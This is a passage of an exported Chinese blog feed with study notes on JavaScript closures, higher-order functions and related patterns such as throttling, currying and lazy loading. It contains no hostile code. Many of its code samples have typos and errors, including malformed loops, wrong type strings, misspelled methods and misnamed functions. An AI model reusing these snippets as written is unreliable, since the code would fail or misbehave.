当然，发布—订阅模式也不是完全没有缺点。创建订阅者本身要消耗一定的时间和内存，而且当你订阅一个消息后，也许此消息最后都未发生，但这个订阅者会始终存在于内存中。另外，发布—订阅模式虽然可以弱化对象之间的联系，但如果过度使用的话，对象和对象之间的必要联系也将被深埋在背后，会导致程序难以跟踪维护和理解。特别是有多个发布者和订阅者嵌套到一起的时候，要跟踪一个 bug 不是件轻松的事情。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——前言准备]]></title>
    <url>%2F2019-01-26-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E5%89%8D%E8%A8%80%E5%87%86%E5%A4%87.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——前言准备在开始之前，复习一下闭包和高阶函数。 闭包和高阶函数虽然，JavaScript 是一门完整的面向对象的编程语言，但这门语言同时也有许多函数式语言的特性。 函数式语言的鼻祖是 LISP ，JavaScript 在设计之初参考了 LISP 两大方言之一的 Scheme ，引入了 Lambda 表达式、闭包、高阶函数等特性。使用这些特性，可以用一洗灵活而巧妙的方式来编写 JavaScript 代码。 JavaScript 很多模式都用到闭包和高阶函数来实现. 闭包闭包的形成与变量的作用域已经变量的生存周期密切相关。 变量的作用域变量的作用域，就是指变量的有效范围，我们最常说的就是在函数声明的变量作用域。 当在函数中声明一个变量的时候，如果该变量前面没有加上 var 关键字，这个变量就会变成全局变量。 另外一种情况是用 var 关键字在函数声明变量，这时候的变量即是局部变量，只有在该函数内部才能访问到这个变量，在函数外面是访问不到的。 123456var func = function()&#123; var a = 1; console.log(a); // 输出：1&#125;func(); console.log(a); // Uncaught ReferenceError: a is not defined 搜索的过程会随着代码的执行环节创建的作用域链往外层逐层搜索，一直到全局对象为止。变量的搜索是从内到外。 尝试得出下面代码的答案，可以加深对变量搜索过程的理解： 123456789101112var a = 1;var func = function()&#123; var b = 2; var func2 = function()&#123; var c = 3; console.log(b); console.log(a); &#125; func2(); console.log(c);&#125;func(); 变量的生存周期除了变量的作用域之外，另外一个跟闭包有关的概念是变量的生存周期。 对于全局变量来说，全局变量的生存周期是永久的，除非我们主动销毁这个全局变量。而对于在函数内用 var 关键字声明的局部变量来说，当退出函数时，这些局部变量即失去了它们的价值，它们会随着函数调用的结束而被销毁： 12345678910111213141516171819202122var func = function()&#123; var a = 1; console.log(a); // 退出函数后，局部变量 a 将被销毁&#125;func();// 下一个例子var func = function()&#123; var a = 1; return function()&#123; a++; console.log(a); &#125;&#125;var f = func();f(); // 2f(); // 3f(); // 4f(); // 5/*跟上面的结论相反，这是因为当执行了 var f = func() 时候，f 返回了一个匿名函数的引用，它可以访问到 func 被调用时产生的环境，而局部变量一直在这个环境中。既然局部变量所在的环境还能被外界访问，这个局部变量就有了不变销毁的理由。在这里就产生了一个闭包结构，局部变量的声明看起来延续了。*/ 闭包的经典案例： 1234567891011/*假设页面上有5个 div 节点，我们通过循环来给每个 div 绑定 onclick 时间，按照索引的 顺序，点击第一个 div 演出0，第二个弹出1，以此类推*/var nodes = document.getElementsByTagName('div');for(var i = 0; i &lt; nodes.length; i++)&#123; (function(i)&#123; nodes[i].onClick = function()&#123; console.log(i); &#125; &#125;)(i);&#125; 同样的道理，还有下面的例子： 1234567891011var Type = &#123;&#125;;for(var i = 0; type; type = ['String','Array','Numebr'][i++])&#123; (function(type)&#123; Type["is"+type] = function(obj)&#123; return Object.prototype.toString.call(obj) === "[Object"+type+"]"; &#125; &#125;)(type);&#125;Type.isArray([]); // trueType.isString("str"); // true 闭包的更多作用1.封装变量闭包可以帮助把一些不需要暴露在全局的变量封装成 “私有变量”。假设有一个计算乘积的简单函数： 123456789101112131415161718192021222324252627282930313233343536373839var mult = function()&#123; var a = 1; for(var i = 0; l = arguments.length; i &lt; l; i++)&#123; a = a* arguments[i] &#125; return a;&#125;/* mult 函数接受一些 number 类型的参数，并返回这些参数的乘积，我们觉得对于那些相同的参数来说，每次进行计算是一种浪费，我们可以加入缓存机制来提高这个函数的性能：*/var cache = &#123;&#125;;var mult = function()&#123; var args = Array.prototype.join.call(arguments,','); if(cache[args])&#123; return cache[args]; &#125; var a = 1; for(var i = 0; l = arguments.length; i &lt; l; i++)&#123; a = a* arguments[i] &#125; return cache[args] = a;&#125;/*可以看到 cache 这个变量仅仅在 mult 函数内部使用，与其让 cache 变量跟 mult 函数一起平行地暴露在全局作用域下，不如把它封装在 mult 函数内部。可以减少页面中的全局变量，以避免这个变量在其他地方被不小心修改了而引发错误。改进的如下：*/var mult = (function()&#123; var cache = &#123;&#125;; return function()&#123; var args = Array.prototype.join.call(arguments,','); if(cache[args])&#123; return cache[args]; &#125; var a = 1; for(var i = 0; l = arguments.length; i &lt; l; i++)&#123; a = a* arguments[i] &#125; return cache[args] = a; &#125;&#125;)(); 提炼函数是代码重构的一个常见的技巧，如果在一个大函数中有一些代码能够独立开来，我们常常把这些代码封装在独立的小函数里面。独立出来的小函数有助于代码复用，如果这些小函数有一个良好的命名，它们本身也起到了注释的作用。如果这些小函数不要在程序中其他地方使用，最好用闭包把它们封装起来，如下： 1234567891011121314151617var mult = (function()&#123; var cache = &#123;&#125;; var calculate = function()&#123; // 封闭 calculate 函数 var a = 1; for(var i = 0; l = arguments.length; i &lt; l; i++)&#123; a = a* arguments[i] &#125; return a; &#125; return function()&#123; var args = Array.prototype.join.call(arguments,','); if(cache[args])&#123; return cache[args]; &#125; return cache[args] = calculate.apply(null,arguments); &#125;&#125;)(); 2.延续局部变量的寿命img 对象经常用于进行数据上报，如下所示： 12345var report = function(src)&#123; var img = new Image(); img.src = src;&#125;report('http://laibh.top/getUserInfo'); 但是通过查询后台的记录我们得知，因为一些低版本浏览器的实现存在 bug，在这些浏览器下使用 report 函数进行数据上报会丢失 30%左右的数据，也就是说，report 函数并不是每一次都成功发起了 HTTP 请求。 丢失数据的原因是 img 是 report 函数中的局部变量，当 report 函数的调用结束，img 局部变量也会被销毁，而此时或者还没有来得及发出 HTTP 请求，所以此次请求就会丢失了。 现在我们把 img 变量用闭包封闭起来，便能解决请求丢失的问题： 12345678var report = (function()&#123; var imgs = []; return function(src)&#123; var img = new Image(); imgs.push(img); img.src = src; &#125;&#125;)(); 闭包和面向对象设计过程与数据的结合是 形容面向对象中的“对象”经常使用的表述，对象以方法的形式包含了过程，而闭包则是在过程中以环境的形式包含了数据。通常用面向对象能实现的功能，用闭包也可以实现。反之亦然，在 JavaScript的祖先语言 Scheme 中，甚至都没有提供面向对象的原生设计，但可以用 闭包来实现一个完整的面向对象系统。 123456789101112131415161718192021222324252627282930313233343536373839404142var extent = function()&#123; var value = 0; return&#123; call: function()&#123; value++: console.log(value); &#125; &#125;&#125;var extent = extent();extent.call(); // 1extent.call(); // 2extent.call(); // 3/*对象的写法：*/var extent = &#123; value:0, call:function()&#123; this.value++; console.log(this.value); &#125;&#125;extent.call(); // 1extent.call(); // 2extent.call(); // 3/*或者：*/var Extent = function()&#123; this.value = 0;&#125;Extent.prototype.call = function()&#123; this.value ++; console.log(this.value);&#125;var extent = new Extend();extent.call(); // 1extent.call(); // 2extent.call(); // 3 用闭包实现命令模式在完成闭包实现的命令模式之前，我们先用面向对象的方式来编写一段命令模式的代码 123456&lt;html&gt; &lt;body&gt; &lt;button id="execute"&gt;点击我执行命令&lt;/button&gt; &lt;button id="undo"&gt;点击我执行命令&lt;/button&gt; &lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728var Tv = &#123; open:function()&#123; console.log("打开电视机") &#125;, close:function()&#123; console.log("关闭电视机") &#125;, &#125;var OpenTvCommand = function(receiver)&#123; this.receiver = receiver;&#125;OpenTvCommand.prototype.execute = function()&#123; this.receiver.open(); // 执行命令，打开电视机&#125;OpenTvCommand.prototype.undo = function()&#123; this.receiver.colse(); // 执行命令，关闭电视机&#125;var setCommand = function(command)&#123; document.getElementById('execute').onclick = function()&#123; command.execute(); // 打开电视机 &#125; document.getElementById('undo').onclick = function()&#123; command.undo(); // 关闭电视机 &#125; &#125;setCommand(new OpenTvCommand(Tv)); 命令模式的意图是把请求封装为对象，从而分离请求的发起者和请求的接受者（执行者）之间的耦合关系，在命令被执行之前，可以预先往命令对象中植入命令的接受者。 但在 JavaScript 中，函数作为一等对象，本身就可以四处传递，用函数对象而不是普通对象来封装请求显得更加简单和自然。如果需要往函数对象中预先植入命令的接受者，那么闭包可以完成这个工作。在面向对象版本的命令模式中，预先植入的命令接受者被当成对象的属性保存起来，而在闭包版本的命令模式中，命令接受者会被封闭在闭包形成的环境中，代码如下： 1234567891011121314151617181920212223242526272829var Tv = &#123; open:function()&#123; console.log("打开电视机") &#125;, close:function()&#123; console.log("关闭电视机") &#125; &#125;var createCommand = function(receiver)&#123; var execute = function()&#123; return receiver.open(); &#125; var undo = function()&#123; return receiver.close(); &#125; return &#123; execute,undo &#125;&#125;var setCommand = function(command)&#123; document.getElementById('execute').onclick = function()&#123; command.execute(); // 打开电视机 &#125; document.getElementById('undo').onclick = function()&#123; command.undo(); // 关闭电视机 &#125; &#125;setCommand(createCommand(Tv)); 闭包与内存管理闭包是一个非常强大的特性，但是人们对这个也有诸多误解，一种耸人听闻的说法是闭包会造成内存泄露，所以要尽量减少闭包的使用。 局部变量本来应该在函数退出的时候被解除引用，但如果局部变量被封闭在闭包形成的环境中，那么这个局部变量就能一直生存下去。从这个意义上来看，闭包的确会使得一些数据无法被及时销毁。使用闭包的一部分原因是我们选择主动把一些变量封闭在闭包中，因为可能在以后还需要使用这些变量，把这些变量放在闭包中和全局作用域，对内存方法的影响是一致的，这里不能说成内存泄露，如果在将来需要回收这些变量，我们可以手动把这些变量设置为 null。 跟闭包和内存泄露有关系的是，使用闭包的同时比较容易形成循环引用，如果闭包的作用域链中保存着一些 DOM 节点，这时候就可能造成内存泄露。但这并非闭包的问题，也并非 JavaScript 的问题，在 IE 浏览器中，由于 BOM 和 DOM 中的对象是使用 C++ 以 COM 对象的方式实现的，而 COM 对象的垃圾收集机制采用的是引用计数策略。在基于引用计数策略的垃圾回收机制中，如果两个对象之间形成了循环引用，那么这两个对象都无法被回收，但循环引用造成的内存泄露在本质上也不是闭包造成的。 同样，如果要解决循环引用带来的内存泄露的问题，我们只需要把循环引用中的变量设为 null，将变量设为 null 以为着切断变量与它此前的引用的值连接。当垃圾收集器下次运行时，将会删除这些值并回收它们占用的内存。 高阶函数高阶函数是指至少满足下列条件之一的函数 函数可以作为参数被传递 函数可以作为返回值输出 JavaScript 语言中的函数显然满足高阶函数的条件，在实际开发中，无论是将函数当做参数传递，还是让函数的执行结果返回一个函数，这两种场景都有很多应用场景。 函数作为参数传递把函数作为参数传递，这代码我们可以抽离出一部分容易变化的业务逻辑，把这部分业务逻辑放在函数形参中，这样一来就可以分离业务中代码变化与不变的部分，其中一个重要的场景就是在常见的回调函数中。 1.回调函数在 ajax 异步请求的应用中，回调函数的使用非常频繁，当我们想在 ajax 请求返回之后做一些事情，但又并不知道请求返回的确切时间时，最常见的方案就是把 callback 函数当做参数传入发起 ajax请求的方法中，待请求完成之后执行 callback 函数： 12345678910var getUserInfo = function(userId,callback)&#123; $.ajax("http://laibh.top/getUserInfo?"+userId,function(data)&#123; if(typeof callback === 'function')&#123; callback(data); &#125; &#125;);&#125;getUserInfo(12464,function(data)&#123; console.log(data.userName);&#125;); 回调函数的应用不仅只在异步请求中，当一个函数不适合执行一些请求时，我们也可以把这些请求封装成一个函数，并把它作为参数传递给另一个函数，“委托”给另外一个函数来执行。 比如，我们想在页面中创建100 个 div 节点，然后把这些节点都设置为隐藏，下面是一个方法： 1234567891011121314151617181920212223242526272829var appendDiv = function()&#123; for(var i = 0; i&lt; 100; i++)&#123; var div = document.createElement('div'); div.innerHTML = i; document.body.appendChild(div); div.style.display = 'none'; &#125;&#125;appendDiv();/*把 div.style.display = 'none' 的逻辑硬编码在 appendDiv 中显然是不合理的，appendDiv 未免有点个性化，称为了一个难以复用的函数，并不是每个人创建了节点之后就希望它们立即被隐藏，于是我们这这段代码抽出来，用回调函数的形式传入 appendDiv 中*/var appendDiv = function(callback)&#123; for(var i = 0; i&lt; 100; i++)&#123; var div = document.createElement('div'); div.innerHTML = i; document.body.appendChild(div); if(typeof callback === 'function')&#123; callback(div); &#125; &#125;&#125;appendDiv(function(node)&#123; node.style.display = 'none';&#125;);/*可以看到隐藏节点的请求实际上是由客户发起的，但是客户并不知道节点什么时候会创建好，于是把隐藏节点的逻辑放在回调函数中，”委托“给 appendDiv 方法，appenDiv 方法当然知道节点什么时候创建好，所以在节点创建好的时候，appendDiv 会执行之前客户传入的回调函数。*/ 2.Array.prototype.sortArray.prototype.sort 可以接受一个函数作为参数，这个函数里面封装了数组元素的排序规则。从 Array.prototype.sort 的使用可以看到，我们目的是对数组进行排序，这是不变的部分，而使用什么规则去排序，则是可变的部分。把可变的部分封装在函数参数里，动态传入 Array.prototype.sort ，使得 Array.prototype.sort 方法成为一个灵活的方法，代码如下： 123456789// 从小到大排序[1,4,3].sort(function(a,b)&#123; return a - b;&#125;);// 从大到小排序[1,4,3].sort(function(a,b)&#123; return b - a;&#125;); 函数作为返回值输出相比把函数作为参数传递，函数作为返回值输出的应用场景也很多。也能体现函数式编程的巧妙，让函数继续返回一个可执行的函数，意味着运算过程是可以延续的。 1.判断数据类型 判断一个数据是否是数组，在以往的现实中，可以基于鸭子类型的概念来判断，比如判断这个数据有没有 length 属性，有没有 sort 或者是 slice 方法等。但更好的方式是用 Object.prototype.toString 来计算。Object.prototype.toString.call(obj) 返回一个字符串，比如 Object.prototype.toString.call([1,2,3]) 总是返回 “[Object Array]” ，而 Object.prototype.toString.call(“str”); 总是返回 “[Object String]”。所以我们可以编写一个 isType 函数，代码如下： 123456789101112131415161718192021222324252627282930313233343536var isString = function(obj)&#123; return Object.prototype.toString.call(obj) === '[Object String]';&#125;var isArray = function(obj)&#123; return Object.prototype.toString.call(obj) === '[Object Array]';&#125;var isNumber = function(obj)&#123; return Object.prototype.toString.call(obj) === '[Object Number]';&#125;/*上面的代码中，函数的实现大部分都是一样的，不同的只是 Object.prototype.toString.call(obj) 返回的字符串，为了避免多余的代码。我们尝试把这些字符串作为参数提前植入 isType 函数。*/var isType = function(type)&#123; return function(obj)&#123; return Object.prototype.toString.call(obj) === "[Object" +type+ "]"; &#125;&#125;var isString = isType("String");var isArray = isType("Array");var isNumber = isType("Number");console.log(isArray([1,2,3])); // true/*还可以使用循环来注册这些 isType 函数*/var Type = &#123;&#125;for(var i = 0; type; type = ['String','Array','Number'];i++)&#123; (function(type)&#123; Type['is'+type] = function(obj)&#123; return Object.prototype.toString.call(obj) === "[Object" +type+ "]"; &#125; &#125;)(type)&#125;Type.isArray([1,2,3]); // true 2.getSingle下面是一个单例模式的例子，这里暂且只了解其代码实现： 123456var getSingle = function(fn)&#123; var ret; return function()&#123; return ret || (ret = fn.apply(this,arguments)) &#125;&#125; 上面这个高阶函数的例子，既把函数当作参数传递，又让函数执行后返回了另外一个函数，我们可以看看 getSingle 函数的效果 1234567var getScript = getSingle(function()&#123; return document.createElement('script');&#125;);var script1 = getScript();var script2 = getScript();console.log(script1 === script2); // true 高阶函数实现 AOPAOP（面向切面编程）的主要作用是把一些核心业务逻辑无关的功能抽离出来，这些跟业务逻辑无关的功能通常包括日志统计、安全控制、异常处理等。把这些功能抽离分来之后，再通过“动态织入”的方式掺入业务逻辑模块中。这样做的好处是首先是可以保持业务逻辑模块的纯净和高内聚性，其次是可以方便地复用日志统计等功能模块。 在 Java 语言中，可以通过反射和动态代理机制来实现 AOP 技术。而在 JavaScript 这种动态语言中，AOP 更加简单，这是 JavaScript 与生俱来的能力。 通常在 JavaScript 中实现 AOP 是指把一个函数 “动态织入”到另一个函数之中，具体的实现技术很多，本节通过扩展 Function.prototype 来做到这一点。代码如下： 12345678910111213141516171819202122232425262728Function.prototype.before = function(beforefn)&#123; var _self = this; // 保存原函数的引用 return function()&#123; // 返回包含了原函数和新函数的“代理函数” beforefn.apply(this,arguments); // 执行新函数，修正 this return _self.apply(this,arguments); // 执行原函数 &#125;&#125;Function.prototype.after = function(afterfn)&#123; var _self = this; return function()&#123; var ret = _self.apply(this,arguments); afterfn.apply(this,arguments); return ret; &#125;&#125;var func = function()&#123; console.log(2);&#125;func = func.before(function()&#123; console.log(1);&#125;).after(function()&#123; console.log(3);&#125;);func(); // 1 // 2// 3 这种使用 AOP 的方式来给函数添加职责，也是 JavaScript 语言中一种非常也别和巧妙的装饰者模式。这种装饰着模式在实际开发中非常有用。 高阶函数的其他应用1.currying函数柯里化（function currying）。currying 的概念是由俄国数学家 Moses Schönfinkel 发明，而后由著名的数理逻辑学家 Haskell Curry 将其丰富和发展，currying 由此得名。 currying 又称为部分求值，一个 currying 的函数首先会接受一些参数，接受了这些参数之后，该函数不会立即求值，而是继续返回另外一个函数，刚才传入的参数在函数形成的闭包中被保存起来。待到函数被真正需要求值的时候，之前传入的所有参数都会被一次性用于求值。 假设我们要编写一个计算每月开销的函数，在每天结束之前，我们都要记录今天花掉了多少钱，代码如下： 12345678910111213141516171819202122232425262728293031323334var monthlyCost = 0;var cost = function(money)&#123; monthlyCost += money;&#125;cost(100); // 第 1 天开销cost(100); // 第 2 天开销cost(300); // 第 3 天开销console.log(monthlyCost); // 输出开销：500/*其实我们并不太关心每天花掉了多少钱，而是只想知道月底的时候花掉了多少钱，也就是说，实际上只需要在月底计算一次。*/var cost = (function()&#123; var args = []; return function()&#123; if(arguments.length === 0)&#123; var money = 0; for(var i = 0; i &lt; args.length; i++)&#123; money += args[i]; &#125; return money; &#125;else&#123; [].push.apply(args,arguments); &#125; &#125;&#125;)();cost(100); // 未真正求值cost(100); // 未真正求值cost(300); // 未真正求值console.log(cost()); // 输出开销：500 下面是一个通用的 function currying(){} 。接受一个参数，即将要被 currying 的函数，在这个例子中，这个函数的作用遍历本月每天的开销并求出它们的总和。 1234567891011121314151617181920212223242526272829var currying = function(fn)&#123; var args = []; return function()&#123; if(arguments.length === 0)&#123; return fn.apply(this,args); &#125;else&#123; [].push.apply(args,arguments); return arguments.callee; &#125; &#125;&#125;var cost = (function()&#123; var money = 0; return function()&#123; for(var i = 0; i &lt; arguments.length; i++)&#123; money += arguments[i] &#125; return money; &#125;&#125;)();var cost = currying(cost); // 转换为 curring 函数cost(100); // 未真正求值cost(100); // 未真正求值cost(300); // 未真正求值console.log(cost()); // 输出开销：500 当调用 cost 函数时，如果明确地带上了一些参数，表示该函数此时并不是真正的求值计算，而是把这些参数保存起来，此时让 cost 函数返回另一个函数。只有当我们可以不带参数的形式执行 cost 时，才利用前面保存的采纳数，真正开始进行求值计算。 2.uncurrying在 JavaScript 中，当我们调用对象的某个方法的时候，其实不用关系该对象原本是否被 设计为拥有这个方法，这是动态类型语言的特点，也就是常说的鸭子类型。 同理，一个对象也未必只能使用它自身的方法，那么有什么办法可以让对象去借用一个原本不属于它的方法呢？ 答案很简单，apply 和 call 都可以。 12345678910var obj1 = &#123; name:'sven'&#125;var obj2 = &#123; getName:function()&#123; return this.name; &#125;&#125;console.log(obj2.getName.call(obj1)); // sven 我们常常让类数组对象去借用 Array.prototype 的方法，这是 call 和 apply 最常见的引用场景之一： 1234(function()&#123; Array.prototype.push.call(arguments,4); // arguments 借用 Array.protytype.push 方法 console.log(arguments);&#125;)(1,2,3); 在我们预期中，Array.prototype 上的方法原本只能用来操作 array 对象，但用 call 和 apply 可以把任意对象当做 this 来传入某个方法，这样一来，方法中用到的 this 的方法就不再局限于原来规定的对象了，而是加以泛化并得到更广的适用性。 那么有没有把泛化 this 的过程提取出来呢？uncurrying 就是来解决这个问题的。uncurrying 的话题是 JavaScript 之父 Brendan Eich 在 2011 年发表的一篇 Twitter。以下代码是 uncurrying 的实现方式之一： 1234567Function.prototype.uncurrying = function()&#123; var self = this; return function()&#123; var obj = Array.prototype.shift.call(arguments); return self.apply(obj,arguments); &#125;&#125; 类数组对象 arguments 借用 Array.prototype 的方法之前，先把 Array.prototype.push.call() 这句代码转换为一个通用的 push 函数： 123456var push = Array.prototype.push.uncurrying();(function()&#123; push(arguments,4); console.log(arguments);&#125;)(1,2,3);// [1,2,3,4] 通过 uncurrying 的方式，Array.prototype.push.call 变成了一个通用的 push 函数，这样一来，push 函数的作用就跟 Array.prototype.push 一样了，同样不仅仅局限于只能操作 array 对象。而对于使用者来说，调用 push 函数的方式也显得更加简洁和意图明了了。 我们还可以一次性将 Array.prototype 上的方法“复制”到 array 对象，同样这些方法可操作的对象也不仅仅是 array 对象 123456789101112131415161718192021222324for(var i = 0; fn, ary = ['push','shift','forEach'];fn = ary[i++])&#123; Array[fn] = Array.prototype[fn].currying();&#125;var obj = &#123; "length":3, "0":1, "1":2, "2":3&#125;Array.push(obj,4); console.log(obj.length); // 4var first = Array.shift(obj);console.log(first); // 1console.log(obj); // &#123;0:2,1:3,2:4,length:3&#125;Array.forEach(obj,function(i,n)&#123; console.log(n);&#125;);// 0// 1// 2 甚至 Function.prototype.call 和 Function.prototype.apply 本身也可以被 uncurrying ,不过这并没有实用价值，只是使得对函数的调用看起来更像是 JavaScript 语言的前身 Scheme 123456789101112var call = Function.prototype.call.uncurrying();var fn = function(name)&#123; console.log(name);&#125;call(fn,window,'sven'); // svenvar apply = Function.prototype.apply.uncurrying();var fn = function(name)&#123; console.log(name); console.log(arguments);&#125;apply(fn,&#123;name:'sven'&#125;,[1,2,3]); uncurrying 的另外一种实现方式： 123456Function.prototype.uncurrying = function()&#123; var self = this; return function()&#123; return Function.prototype.call.apply(self,arguments); &#125;&#125; 3.函数节流JavaScript 中函数大多数情况下都是由用户主动调用触发的，除非是函数本身的实现不合理，否则我们不会遇到跟性能相关的问题。但是在一些少数情况下，函数的触发不是由用户直接控制的。在这些场景下，函数有可能会被非常频繁地调用，而造成很大的性能问题。下面列举一些场景。 （1）函数被频繁调用的场景 window.onresize 事件。给 window 对象绑定了这个事件后，当浏览器窗口大小被拖动而改变的时候，这个事件的触发频率很高，如果我们在 window.onresize 事件函数里面有一些跟 DOM 节点相关的操作，而跟 DOM 节点相关的操作往往是非常消耗性能的，这时候浏览器就有可能会吃不消而造成卡顿的现象。 mousemove 事件。同样我们给一个 div 节点绑定了拖曳事件（主要是 mouseover）,当 div 节点被拖动的时候，也会频繁触发该拖曳事件函数 上传进度，微云的上传功能使用了一个浏览器插件。该浏览器插件在真正开始上传文件之前，会对文件进行扫描并通知 JavaScript 函数，以便在页面中显示当前的扫描进度。但该插件通知的频率非常之高，大约1秒10次，很显然我们在页面中不需要如此频繁地去提示用户。 （2）函数节流的原理 函数节流的是实现有很多种，下面的 throttle 函数的原理是，将即将要被执行的函数用 setTimeout 延迟一段时间执行。如果该延迟执行还没有完成，则忽略接下来调用该函数的请求。throttle 接受两个参数，第一个为需要被延迟执行的函数，第二个参数是为延迟执行的时间。 12345678910111213141516171819202122var throttle = function(fn,interval)&#123; var _self = fn, // 保存需要被延迟执行的函数引用 timer, // 定时器 firstTime = true; // 是否第一次调用 return function()&#123; var args = arguments, _me = this; if(firstTime)&#123; // 如果是第一次调用，不需要延迟执行 _self.apply(_me,args); return firstTime = false; &#125; timer = setTimeout(function()&#123; // 延迟一段时间执行 clearTimeout(timer); timer = null; _self.apply(_me,args); &#125;,interval || 500); &#125;&#125;window.onresize = throttle(function()&#123; console.log(1);&#125;,500); 4.分时函数上面提供了一种限制函数被频繁调用的解决方案，但是还有另外一个问题，某些函数是用户主动调用的，但是这些函数有时候会严重影响页面性能。 一个例子就是创建 WebQQ 的 QQ 好友列表，列表中通常有很多个好友，如果一个好友用一个节点来表示，当我们在页面中渲染这个列表的时候，可能一次性要创建成百上千个节点。 在短时间内页面大量添加 DOM 节点显然会让浏览器吃不消，那么可能浏览器会卡死或者是卡顿。 1234567891011121314var ary = [];for(var i = 0; i &lt;= 1000; i++)&#123; ary.push(i);&#125;var renderFrinedList = function(data)&#123; for(var i = 0; i &lt;= data.length; i++)&#123; var div = document.createElement('div'); div.innerHTML = i; document.body.appendChild(div); &#125;&#125;renderFrinedList(ary); 这个问题的解决方案之一是下面的 timeChunk 函数，timeChunk 函数让创建节点的工作分批进行，比如每1秒创建1000个节点，改成了每隔200毫秒创建8个节点。 timeChunk 接受三个参数，第一个参数是创建节点时需要的用到的数据，第二个参数是封装了创建节点逻辑的函数，第三个参数表示每一批创建节点的数量。 12345678910111213141516171819202122232425262728293031323334var timeChunk = function(ary,fn,count)&#123; var obj, t; var len = ary.length; var start = function()&#123; for(var i = 0; i &lt; Math.min(count || 1, ary.length); i++)&#123; var obj = ary.shift(); fn(obj); &#125; &#125; return function()&#123; t = setInterval(function()&#123; if(ary.length === 0)&#123; // 如果节点全部创建好了 return clearInterval(t); &#125; start(); &#125;,200); &#125;&#125;// 测试，假设我们有 1000 个好友的数据，我们利用 timeChunk 函数，每一批只往页面中创建 8 个节点：var args = [];for(var i = i; i &lt;= 1000; i++)&#123; args.push(i);&#125;var renderFriendList = timeChunk(ary,function(n)&#123; var div = document.createElement('div'); div.innerHTML = n; document.body.appendChild(div);&#125;,8) renderFrinedList(); 5.惰性加载函数在 Web 开发中，因为浏览器之间的实现差异，一些嗅探工作总是不可避免的，比如我们需要一个在各个浏览器中能够通用的事件绑定函数 addEvent,常见的方法如下： 12345678var addEvent = function(elem,type,handler)&#123; if(window.addEventListener)&#123; return elem.addEventListener(type,handler,false); &#125; if(window.attackEvent)&#123; return elem.attackEvent('on'+type,handler); &#125;&#125; 这个函数的缺点是，当它每次被调用的时候都会执行里面的 if 条件分支，虽然执行这些 if 分支的开销不算大，但也许有一些方法可以让程序避免重复的执行过程。 第二种方案是这样的，我们把嗅探浏览器的操作提前到代码加载的时候。在代码加载的是就立刻进行一次判断，以便让 addEvent 返回一个包裹了正确逻辑的函数。代码如下： 123456789101112var addEvent = (function()&#123; if(window.addEventListener)&#123; return function function(elem,type,handler)&#123; elem.addEventListener(type,handler,false); &#125; &#125; if(window.attackEvent)&#123; return function function(elem,type,handler)&#123; elem.attackEvent('on'+type,handler); &#125; &#125; &#125;)(); 目前的 addEvent 函数依然有个缺点，也许我们从头到尾都没有使用过 addEvent 函数，这样看来，前一次的浏览器嗅探就是完全多余的操作，而且这也会稍稍延长页面 ready 的时间。 第三种方案就是惰性载入函数方案，此时 addEvent 依然被声明为一个普通函数，在函数里面依然有一些分支判断。但是在第一次进入条件分支之后，在函数内部会重写这个函数，重写之后的函数就是我们期望的 addEvent 函数，在下一次进去 addEvent 函数的时候，addEvent 函数里面就不存在分支语句了： 12345678910111213var addEvent = function(elem,type,handler)&#123; if(window.addEventListener)&#123; addEvent = function function(elem,type,handler)&#123; elem.addEventListener(type,handler,false); &#125; &#125; else if(window.attackEvent)&#123; addEvent = function function(elem,type,handler)&#123; elem.attackEvent('on'+type,handler); &#125; &#125; addEvent(elem,type,handler);&#125; 小结在进入设计模式的学习之前，本章挑选了闭包和高阶函数来进行讲解。这是因为在 JavaScript开发中，闭包和高阶函数的应用极多。就设计模式而言，因为 JavaScript 这门语言的自身特点，许多设计模式在 JavaScript 之中的实现跟在一些传统面向对象语言中的实现相差很大。在JavaScript 中，很多设计模式都是通过闭包和高阶函数实现的。这并不奇怪，相对于模式的实现过程，我们更关注的是模式可以帮助我们完成什么]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你不知道的JavaScript(上)——行为委托]]></title>
    <url>%2F2019-01-23-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript(%E4%B8%8A)%E2%80%94%E2%80%94%E8%A1%8C%E4%B8%BA%E5%A7%94%E6%89%98.html</url>
    <content type="text"><![CDATA[这个系列的作品是上一次当当网有活动买的，记得是上一年九月份开学季的时候了。后面一直有其他的事情，或者自身一些因素，迟迟没有开封这本书。今天立下一个 flag，希望可以在两个月内看完并记录这个系列的三本书，保持学习的激情，不断弥补自己的基础不够扎实的缺点。 作者的github 书籍的购买链接，自己搜。 你不知道的JavaScript(上)——行为委托回顾上一章的理论：[[Prototype]] 机制就是指对象中的一个内部链接引用另一个对象。 如果在第一个对象上没有找到需要的属性或者方法引用，引擎就会继续在 [[Prototype]] 关联的对象上进行查找。同理，如果在后者中也没有找到需要的引用就会继续查找它的 [[Prototype]] ,以此类推，这一系列对象的链接被称为“原型链”。 换句话说，JavaScript 中这个机制的本质就是对象之间的关联关系。 面向委托的设计试着把思路从类和继承的设计模式转换到委托行为的设计模式。 类理论假设我们需要在软件中建模一些类似的任务（“XYZ”，“ABC”等）。 如果使用类，那设计方法可能是这样的：定义一个通用父（基）类，可以将其命名为 Task,在 Task 类中定义所有任务都有的行为。接着定义子类 XYZ 和 ABC，它们都继承自 Task 并且添加一些特殊的行为来处理对应的任务。 非常重要的是，类设计模式鼓励你在继承时使用方法重写（和多态），比如在 XYZ 任务中重写 Task 中定义的一些通用的方法，甚至在添加新行为时通过 super 调用这个方法的原始版本。你会发现许多行为可以先 “抽象”到父类然后再用子类进行特殊化（重写）。 下面的是对应的伪代码： 123456789101112131415class Task&#123; id: // 构造函数 Task() Task(ID)&#123;id = ID&#125; outputTask()&#123;output(id);&#125;&#125;class XYZ inherits Task&#123; label; // 构造函数 XYZ() XYZ(ID,Label)&#123;super(ID);label = Label&#125; outputTask()&#123;super(); 